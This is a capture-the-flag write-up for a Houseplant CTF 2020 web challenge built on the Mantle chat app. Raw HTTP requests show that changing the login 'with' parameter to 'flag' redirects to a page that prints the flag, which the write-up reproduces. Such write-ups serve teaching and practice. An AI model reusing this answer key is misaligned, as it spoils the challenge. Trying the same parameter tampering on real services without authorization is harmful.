# Houseplant CTF 2020 – Selfhost all the things!

* **Category:** web
* **Points:** 1000

## Challenge

> The amount of data that online services like Discord and Instagram collect on us is staggering, so I thought I'd selfhost a chat app!
> 
> http://challs.houseplant.riceteacatpanda.wtf:30005
> 
> The chat database is wiped every hour.
> 
> This app is called Mantle and is open source. You can find its GitHub repo at https://github.com/nektro/mantle.
> 
> Dev: Tom
>
> Hint! discord more like flag

## Solution

The webpage has a link to enter in the chat.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Mantle</title>
        <link rel="stylesheet" href="./css/main.min.css">
    </head>
    <body>
        <main>
            <h1>Mantle</h1>
            <p>The new easy and effective communication platform for any successful team or community, providing you the messaging and voice platform that puts you in charge of both the conversation and the data.</p>
            <p><a href="./login">Enter</a></p>
        </main>
    </body>
</html>
```

Clicking on it, you will be redirected to another page where you can select the OAuth2 Identity Provider.

Choosing `discord`, the following HTTP request will be generated.

```
GET /login?with=discord HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1

HTTP/1.1 302 Found
Location: https://discordapp.com/api/oauth2/authorize?client_id=<REDACTED>&duration=temporary&redirect_uri=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30005%2Fcallback&response_type=code&scope=identify&state=discord
Date: Fri, 24 Apr 2020 23:02:04 GMT
Content-Length: 0
Connection: close
```

You can notice that `with` HTTP GET parameter manipulation is possible.

```
GET /login?with=foo HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 23:02:43 GMT
Content-Length: 0
Connection: close
```

Using the value `flag` will cause an interesting redirection.

```
GET /login?with=flag HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1

HTTP/1.1 302 Found
Location: http://challs.houseplant.riceteacatpanda.wtf:40002?client_id=1&duration=temporary&redirect_uri=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30005%2Fcallback&response_type=code&scope=profile&state=flag
Date: Fri, 24 Apr 2020 23:03:06 GMT
Content-Length: 0
Connection: close
```

Following the redirection will return a webpage with the flag.

```
GET /?client_id=1&duration=temporary&redirect_uri=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30005%2Fcallback&response_type=code&scope=profile&state=flag HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1
Host: challs.houseplant.riceteacatpanda.wtf:40002

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 23:03:27 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 429
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
	<head>
		<title>You got the flag!</title>
		<style>
	        .container {
	            position: absolute;
	            left: 50%;
	            top: 50%;
	            transform: translate(-50%, -50%);
	        }
	        body {
	            font-family: sans-serif;
	        }
    	</style>
	</head>
	<body>
		<div class="container">
			<h4>rtcp{rtcp-*is-s/ort-of-se1fh0st3d}</h4>		</div>
	</body>
</html>
```

So the flag is the following.

```
rtcp{rtcp-*is-s/ort-of-se1fh0st3d}
```